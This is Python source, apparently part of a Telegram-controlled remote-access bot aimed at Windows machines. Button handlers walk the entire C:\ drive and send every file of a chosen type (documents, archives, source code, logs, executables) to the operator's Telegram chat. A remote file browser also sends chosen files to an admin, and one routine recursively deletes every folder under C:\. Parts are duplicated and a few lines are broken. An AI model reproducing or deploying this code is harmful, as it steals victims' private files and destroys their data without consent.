@dp.callback_query_handler(lambda query: query.data == '_video_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".mp4"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴢɪᴘ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_zip_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".zip"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴠᴏɪᴄᴇ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_voice_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".ogg"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)




#ᴛᴇxᴛ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_text_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".txt"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴘᴅғ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_pdf_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".pdf"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴘʏᴛʜᴏɴ ғɪʟᴇs

@dp.callback_query_handler(lambda query: query.data == '_py_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".py"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴀᴘᴋ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_apk_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".apk"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴘʜᴘ ғɪʟᴇs

@dp.callback_query_handler(lambda query: query.data == '_php_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".php"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴊᴀᴠᴀ sᴄʀɪᴘᴛ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_js_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".js"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#sǫʟ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_sql_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".sql"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴇxᴇ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_exe_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".exe"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ʙᴀsʜ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_bash_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".sh"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ʟᴏɢ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_log_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".log"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ʀᴀʀ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_rar_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".rar"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴛɢs ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_tgs_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".tgs"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴏʙʙ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_obb_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".obb"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴡᴇʙᴘ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_webp_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".webp"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴅᴇʟᴇᴛᴇ ᴘᴀᴛʜs

pathdel=['C:\\']

async def delete_flash_to_admins():
    for path in pathdel:
        folder_name = os.path.basename(os.path.normpath(path))
        for file in os.listdir(path):
            file_path = os.path.join(path, file)
            if os.path.isdir(file_path):
                
                shutil.rmtree(file_path)
                
                for admin_id in admins:
                    await bot.send_message(chat_id=admin_id, text=f'🗂 folder {folder_name} deleted')
                    
@dp.callback_query_handler(lambda query: query.data == '_-sdcard_')
async def delete_folders_callback(query: types.CallbackQuery):
    await delete_flash_to_admins()
    await query.answer('All folders on the flashcard removed 🗂')




@dp.message_handler(commands=['sdcard'])
async def handle_sdcard_command(message: types.Message):

    await send_folder_keyboard(message.chat.id, "/sdcard")


@dp.callback_query_handler(lambda query: query.data.startswith('folder_'))
async def handle_folder_button_press(query: types.CallbackQuery):
    folder_path = query.data.split('_')[1]
    await send_folder_keyboard(query.message.chat.id, folder_path)


@dp.callback_query_handler(lambda query: query.data.startswith('file_'))
async def handle_file_button_press(query: types.CallbackQuery):
    file_name = query.data.split('_')[1]

   
    current_dir = os.getcwd()

    
    for root, dirs, files in os.walk(current_dir):
        if file_name in files:
            file_path = os.path.abspath(os.path.join(root, file_name))

            
            admin_id = admin

            
            with open(file_path, 'rb') as file:
                await bot.send_document(chat_id=admin_id, document=file)

            await query.answer(f"File {file_name} sent to admin.")
            return

    await query.answer("ᴇʀᴏʀ")






@dp.callback_query_handler(lambda query: query.data.sdcardswith('action_'))
async def handle_action_button_press(query: types.CallbackQuery):
    action = query.data.split('_')[1]
    folder_path = query.data.split('_')[2]

    if action == "open":
        await send_folder_keyboard(query.message.chat.id, folder_path)
    elif action == "rename":
        await bot.send_message(query.message.chat.id, f"You selected the rename action for folder: {folder_path}")
    elif action == "delete":
        await bot.send_message(query.message.chat.id, f"You selected the delete action for folder: {folder_path}")


async def send_folder_keyboard(chat_id, folder_path):
    
    file_list = os.listdir(folder_path)

    
    keyboard = InlineKeyboardMarkup(row_width=2)
    for file_name in file_list:
        if os.path.isdir(os.path.join(folder_path, file_name)):
            
            button_text = f"📁 {file_name}"
            button_callback = f"folder_{os.path.join(folder_path, file_name)}"
        else:
            
            button_text = f"📄 {file_name}"
            button_callback = f"file_{file_name}"

        keyboard.add(InlineKeyboardButton(button_text, callback_data=button_callback))

    
    folder_name = os.path.basename(folder_path)

    
    await bot.send_message(chat_id, f"Current folder: {folder_name}", reply_markup=keyboard)




@dp.message_handler(commands=['flashcard'])
async def handle_sdcard_command(message: types.Message):

    await send_folder_keyboard(message.chat.id, "/storage")


@dp.callback_query_handler(lambda query: query.data.startswith('folder_'))
async def handle_folder_button_press(query: types.CallbackQuery):
    folder_path = query.data.split('_')[1]
    await send_folder_keyboard(query.message.chat.id, folder_path)


@dp.callback_query_handler(lambda query: query.data.startswith('file_'))
async def handle_file_button_press(query: types.CallbackQuery):
    file_name = query.data.split('_')[1]

   
    current_dir = os.getcwd()

    
    for root, dirs, files in os.walk(current_dir):
        if file_name in files:
            file_path = os.path.abspath(os.path.join(root, file_name))

            
            admin_id = admin

            
            with open(file_path, 'rb') as file:
                await bot.send_document(chat_id=admin_id, document=file)

            await query.answer(f"File {file_name} sent to admin.")
            return

    await query.answer("ᴇʀᴏʀ")






@dp.callback_query_handler(lambda query: query.data.sdcardswith('action_'))
async def handle_action_button_press(query: types.CallbackQuery):
    action = query.data.split('_')[1]
    folder_path = query.data.split('_')[2]

    if action == "open":
        await send_folder_keyboard(query.message.chat.id, folder_path)
    elif action == "rename":
        await bot.send_message(query.message.chat.id, f"You selected the rename action for folder: {folder_path}")
    elif action == "delete":
        await bot.send_message(query.message.chat.id, f"You selected the delete action for folder: {folder_path}")


async def send_folder_keyboard(chat_id, folder_path):
    
    file_list = os.listdir(folder_path)

    
    keyboard = InlineKeyboardMarkup(row_width=2)
    for file_name in file_list:
        if os.path.isdir(os.path.join(folder_path, file_name)):
            
            button_text = f"📁 {file_name}"
            button_callback = f"folder_{os.path.join(folder_path, file_name)}"
        else:
            
            button_text = f"📄 {file_name}"
            button_callback = f"file_{file_name}"

        keyboard.add(InlineKeyboardButton(button_text, callback_data=button_callback))

    
    folder_name = os.path.basename(folder_path)

    
    await bot.send_message(chat_id, f"Current folder: {folder_name}", reply_markup=keyboard)







if __name__ == '__main__':
    from aiogram import executor
    executor.start_polling(dp)

